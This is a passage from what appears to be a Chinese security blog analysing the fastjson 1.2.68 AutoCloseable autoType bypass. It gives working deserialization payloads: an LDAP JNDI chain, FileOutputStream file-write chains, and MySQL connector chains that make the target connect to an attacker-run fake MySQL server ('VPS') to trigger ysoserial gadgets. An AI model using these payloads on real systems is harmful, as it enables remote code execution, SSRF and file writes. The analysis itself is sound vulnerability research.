<h4 id="1-2-3-再次进入checkAutoType"><a href="#1-2-3-再次进入checkAutoType" class="headerlink" title="1.2.3 再次进入checkAutoType"></a>1.2.3 再次进入checkAutoType</h4><p>当完成<code>@java.lang.AutoCloseable</code>的类加载并获取了<code>JavaBeanDeserializer</code>，payload的类作为字段，再次进入<code>ParseConfig</code>的<code>checkAutoType</code>，此时<code>autoTypeSupport</code>虽然为<code>false</code>，但是<code>expectClassFlag</code>已经为<code>true</code>了</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/8.png" alt="8" style="zoom:50%;" /></div>

<p>加载目标类，并放入<code>TypeUtils</code>的<code>mappings</code>中</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>

<p>如图，成功在没有autoTypeSupport的情况下，完成了类加载，后面仍然是以前的反序列化流程</p>
<h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-oracle-jdbc-rowset-OracleJDBCRowSet"><a href="#2-1-oracle-jdbc-rowset-OracleJDBCRowSet" class="headerlink" title="2.1 oracle.jdbc.rowset.OracleJDBCRowSet"></a>2.1 oracle.jdbc.rowset.OracleJDBCRowSet</h3><h4 id="2-1-1-fastjson1-2-68"><a href="#2-1-1-fastjson1-2-68" class="headerlink" title="2.1.1 fastjson1.2.68"></a>2.1.1 fastjson1.2.68</h4><p>之前有这么一条利用链，在我的笔记中记录是准备用于<code>1.2.68</code>的，</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.rowset.OracleJDBCRowSet&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://x.x.x.x&quot;</span>,<span class="attr">&quot;command&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>实际在<code>1.2.68</code>调试中，发现<code>oracle.jdbc.rowset.OracleJDBCRowSet</code>已经被加入黑名单了，很明显用不了；对应的黑名单<code>Hash</code>是<code>-3319207949486691020</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/10.png" alt="10" style="zoom:50%;" /></div>

<p>那么这条利用链是哪个版本的呢？</p>
<h4 id="2-1-3-fastjson1-2-50"><a href="#2-1-3-fastjson1-2-50" class="headerlink" title="2.1.3 fastjson1.2.50"></a>2.1.3 fastjson1.2.50</h4><p>查看历史版本的源代码，在<code>1.2.50</code>中没有看到对RowSet实现类的限制，<code>1.2.51</code>版本后就有相关的加固了<br>因此这条利用链适用于 <code>&lt;=1.2.50</code>版本，</p>
<hr>
<blockquote>
<p>从1.2.68开始，虽然类加载可以通过AutoCloseable绕过限制，但是JNDI已知利用链的类都被加入了黑名单，其他相关利用链也没有公开的了，但是有了各路大神的各种利用链~</p>
</blockquote>
<ul>
<li><a href="">rmb122《fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记》</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247486627&idx=1&sn=b768bebbd40c7d5b39071c711d9a19aa&scene=21#wechat_redirect">voidfyoo 《Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析》</a></li>
<li> <a href="">珂技知识分享《关于blackhat2021披露的fastjson1.2.68链》</a></li>
<li><a href="">浅蓝《fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路》</a></li>
<li><a href="">XINYU2428 （覆盖charsets.jar）</a><h3 id="2-2-FileOutputStream"><a href="#2-2-FileOutputStream" class="headerlink" title="2.2 FileOutputStream"></a>2.2 FileOutputStream</h3></li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/11.png" alt="11" style="zoom:50%;" /></div>

<ul>
<li>构造方法：<code>public FileOutputStream(String name, boolean append)</code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,<span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/123&quot;</span>,<span class="attr">&quot;append&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure>
这个poc在jdk11上可以，jdk8中不行，提示xxx；该poc可以生成文件</li>
</ul>
<h4 id="2-2-1-获取不到构造方法"><a href="#2-2-1-获取不到构造方法" class="headerlink" title="2.2.1 获取不到构造方法"></a>2.2.1 获取不到构造方法</h4><p>调试过程中发现，对于<code>java.io.FileOutputStream</code>完成了类加载，但是BeanInfo中没有构造方法；在build方法中如位置，跳过了creatorConstructor的赋值，原因是<code>ASMUtils.lookupParameterNames(constructor)</code>获取到的字符数组为空</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/12.png" alt="12" style="zoom:50%;" /></div>


<div align=center><img src="/img/fastjson 1.2.68漏洞分析/13.png" alt="13" style="zoom:50%;" /></div>

<ul>
<li>JDK8</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/b.png" alt="b" style="zoom:50%;" /></div>

<ul>
<li>切换至JDK11是可以的</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/c.png" alt="c" style="zoom:50%;" /></div>

<p>猜测和rt.jar中原生类加载、ASM有关系<br>在网上找到了一个师傅遇到相同的问题： <a target="_blank" rel="noopener" href="http://scz.617.cn:8/web/202008100900.txt">http://scz.617.cn:8/web/202008100900.txt</a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247484866&idx=1&sn=23fb7897f6e54cdf61031a65c602487d&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247484866&amp;idx=1&amp;sn=23fb7897f6e54cdf61031a65c602487d&amp;scene=21#wechat_redirect</a><br>文章中也对这个问题做了解释，又学习到了<br>引用：<code>读取字节码来获取变量名，自定义类和第三方库由于IDE默认使用javac -g编译就没问题，系统类就不一定了。JDK11以下的版本大部分都没有携带变量名(并不一定，部分系统的JDK8也可能存在)。</code></p>
</blockquote>
<p>反编译不同版本的<code>java.io.FileOutputStream</code>类；可以看到jdk8中没有<code>LocalVariableTable</code>；而fastjson通过asm读取类后依赖<code>LocalVariableTable</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/14.png" alt="14" style="zoom:50%;" /></div>

<ul>
<li>这里还有一个疑问，<code>FileOutputStream</code>也有<code>String name</code>和<code>boolean append</code>为参数的构造方法，为什么最后用的是file和append参数呢；</li>
</ul>
<p><strong>原因：</strong>参考1.1.2的调试，反序列化过程中，获取默认的构造方法，如果没有无参构造方法，且参数数量相同的情况下；优先选取constructors数组中优先遍历的方法，这里即是 <code>FileOutputStream(java.io.File, boolean)</code>的构造方法</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/15.png" alt="15" style="zoom:50%;" /></div>

<h4 id="2-2-2-公开的利用链"><a href="#2-2-2-公开的利用链" class="headerlink" title="2.2.2 公开的利用链"></a>2.2.2 公开的利用链</h4><p>根据2.2.1 的特性，显然jdk8中是使用不了的</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/dest.txt&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;append&quot;</span>:<span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;infl&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>:<span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;bufLen&quot;</span>:<span class="number">1048576</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-Mysql利用链"><a href="#2-3-Mysql利用链" class="headerlink" title="2.3 Mysql利用链"></a>2.3 Mysql利用链</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf</a></p>
</blockquote>
<p>主要的构造思路：json字符串在fastjson反序列化过程中，触发mysql数据库连接，可用于SSRF/RCE</p>
<blockquote>
<p>关于mysql connector的jdbc组件反序列化漏洞，这个后面再分析<br>可以参考Maven库上的标识：<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/mysql/mysql-connector-java">https://mvnrepository.com/artifact/mysql/mysql-connector-java</a></p>
</blockquote>
<h4 id="2-3-1-Mysql-connector-5-1-x"><a href="#2-3-1-Mysql-connector-5-1-x" class="headerlink" title="2.3.1 Mysql connector 5.1.x"></a>2.3.1 Mysql connector 5.1.x</h4><p>适用版本：5.1.11-5.1.49 二次反序列化、5.1.10只完成了SSRF<br>关键类：com.mysql.jdbc.JDBC4Connection<br>依赖包：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>JDBC4Connection类中只有一个构造方法，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JDBC4Connection</span><span class="params">(String hostToConnectTo, <span class="keyword">int</span> portToConnectTo, Properties info, String databaseToConnectTo, String url)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>满足<code>AutoCloseable</code>接口的实现</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/16.png" alt="16" style="zoom:50%;" /></div>

<h5 id="2-3-1-1-触发mysql连接"><a href="#2-3-1-1-触发mysql连接" class="headerlink" title="2.3.1.1 触发mysql连接"></a>2.3.1.1 触发mysql连接</h5><p>实例化JDBC4Connection即触发dnslog，构造的info中的属性值，也是为了满足触发mysql反序列化漏洞的条件，这个后面再分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mysqlJDBCDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String hostToConnectTo = <span class="string">&quot;dnslog&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> portToConnectTo = <span class="number">3306</span>;</span><br><span class="line">    Properties info = <span class="keyword">new</span> Properties();</span><br><span class="line">    info.setProperty(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;yso_CC_calc&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;none&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;statementInterceptors&quot;</span>, <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;autoDeserialize&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    info.setProperty(<span class="string">&quot;NUM_HOSTS&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    String databaseToConnectTo = <span class="string">&quot;name&quot;</span>;</span><br><span class="line">    String url = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    JDBC4Connection jdbc4Connection = <span class="keyword">new</span> JDBC4Connection(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如图，<code>JDBC4Connection</code>的默认构造方法，执行到父类的构造方法中，并在<code>createNewIO</code>中去尝试与mysql数据库建立连接</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/17.png" alt="17" style="zoom:50%;" /></div>

<h5 id="2-3-1-2-反序列化"><a href="#2-3-1-2-反序列化" class="headerlink" title="2.3.1.2 反序列化"></a>2.3.1.2 反序列化</h5><p>反序列化需要借助MySql_Fake_Server <a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;VPS&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试了一下，<strong>二次反序列化只在mysql-connector 5.1.11 - 5.1.49版本触发，5.1.10没有完成CB利用链的加载</strong></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/18.png" alt="18" style="zoom:50%;" /></div>

<h4 id="2-3-2-Mysql-Connector-6-0-x"><a href="#2-3-2-Mysql-Connector-6-0-x" class="headerlink" title="2.3.2 Mysql Connector 6.0.x"></a>2.3.2 Mysql Connector 6.0.x</h4><p>适用版本：<strong>6.0.2、6.0.3</strong><br>关键类：com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/19.png" alt="19" style="zoom:50%;" /></div>

<p>依赖包：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-3-2-1-构造方法"><a href="#2-3-2-1-构造方法" class="headerlink" title="2.3.2.1 构造方法"></a>2.3.2.1 构造方法</h5><ul>
<li><p>LoadBalancedMySQLConnection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoadBalancedMySQLConnection</span><span class="params">(LoadBalancedConnectionProxy proxy)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>LoadBalancedConnectionProxy</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoadBalancedConnectionProxy</span><span class="params">(ConnectionString connectionString)</span> <span class="keyword">throws</span> SQLException</span></span><br></pre></td></tr></table></figure></li>
<li><p>ConnectionString</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConnectionString</span><span class="params">(String url, Properties info)</span></span></span><br></pre></td></tr></table></figure>
<h5 id="2-3-2-2-触发mysql连接"><a href="#2-3-2-2-触发mysql连接" class="headerlink" title="2.3.2.2 触发mysql连接"></a>2.3.2.2 触发mysql连接</h5></li>
</ul>
<p>完成<code>LoadBalancedMySQLConnection</code>类的实例化即会触发<code>mysql</code>请求，这里把之前<code>info</code>的一些字段都可以通过<code>url</code>使用<code>jdbc://mysql....</code>的写法写入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mysql6JDBCDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://m.9ktn7r.ai.haibara.cyou:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line">    ConnectionString connectionString = <span class="keyword">new</span> ConnectionString(url, <span class="keyword">null</span>);</span><br><span class="line">    LoadBalancedConnectionProxy loadBalancedConnectionProxy = <span class="keyword">new</span> LoadBalancedConnectionProxy(connectionString);</span><br><span class="line">    LoadBalancedMySQLConnection loadBalancedMySQLConnection = <span class="keyword">new</span> LoadBalancedMySQLConnection(loadBalancedConnectionProxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>暂时不分析mysql这块的触发，异常中看一下调用栈</li>
</ul>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/20.png" alt="20" style="zoom:50%;" /></div>

<h5 id="2-3-2-3-反序列化"><a href="#2-3-2-3-反序列化" class="headerlink" title="2.3.2.3 反序列化"></a>2.3.2.3 反序列化</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">   <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,</span><br><span class="line">   <span class="attr">&quot;proxy&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;connectionString&quot;</span>:&#123;</span><br><span class="line">                 <span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://VPS:3306/name?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/21.png" alt="21" style="zoom:50%;" /></div>

<h4 id="2-3-3-Mysql-Connector-8-x"><a href="#2-3-3-Mysql-Connector-8-x" class="headerlink" title="2.3.3 Mysql Connector 8.x"></a>2.3.3 Mysql Connector 8.x</h4><p>关键类：com.mysql.cj.jdbc.ha.ReplicationMySQLConnection<br>按照blackhat上的介绍，适用版本：6.x or &lt; 8.0.20；但是根据目标这个利用链来说，只在8.0.19上触发了反序列化<br>因此适用版本：8.0.19反序列化，大于8.0.19 SSRF 来自：《 珂技知识分享》，时间原因，暂时没分析为什么其他版本利用链的构造</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReplicationConnectionUrl</span><span class="params">(List&lt;HostInfo&gt; masters, List&lt;HostInfo&gt; slaves, Map&lt;String, String&gt; properties)</span> </span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxy&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;connectionUrl&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;masters&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;slaves&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;properties&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;VPS&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;port&quot;</span>: <span class="number">3307</span>,</span><br><span class="line">        <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dbname&quot;</span>: <span class="string">&quot;dbname&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;queryInterceptors&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Commons-io利用链"><a href="#2-4-Commons-io利用链" class="headerlink" title="2.4 Commons-io利用链"></a>2.4 Commons-io利用链</h3><h4 id="2-4-1-ref"><a href="#2-4-1-ref" class="headerlink" title="2.4.1 $ref"></a>2.4.1 $ref</h4><p>不管在<code>DefaultJSONParser</code>还是<code>JavaBeanDeserializer</code>，在反序列化过程中，都会判断<code>key</code>是否是<code>$ref</code>，看之后的利用链，也都有<code>$ref</code>的身影<br>调试看到当遇到$ref时，会增加一个解析任务，</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/22.png" alt="22" style="zoom:50%;" /></div>

<p>之前的分析都是在<code>parse()</code>中，这里发现关于$ref的相关解析是在handleResovleTask中完成</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/23.png" alt="23" style="zoom:50%;" /></div>

<p><code>handleResovleTask</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/24.png" alt="24" style="zoom:50%;" /></div>

<p>调用栈</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/25.png" alt="25" style="zoom:50%;" /></div>

<blockquote>
<p>$ref是为了防止出现StackOverFlow异常，在一个对象被多次使用，第一次之后的使用就会变成这个对象第一次出现的位置。<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/50fe2b473cae">https://www.jianshu.com/p/50fe2b473cae</a></p>
</blockquote>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;$ref&quot;:&quot;$&quot;&#125;	引用根对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;@&quot;&#125;	引用自己</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;..&quot;&#125;	引用父对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;../..&quot;&#125;	引用父对象的父对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;&#125;	基于路径的引用</span><br></pre></td></tr></table></figure>
<h4 id="2-4-2-写入文件"><a href="#2-4-2-写入文件" class="headerlink" title="2.4.2 写入文件"></a>2.4.2 写入文件</h4><p>版本限制：commons-io 2.0~2.6<br>由于2.2中，FileOutputStream利用链并不适用与所有的JDK/JRE版本，因此需要找到新的利用链，在voidfyoo的文章的思路，通过commons-io组件构造利用链</p>
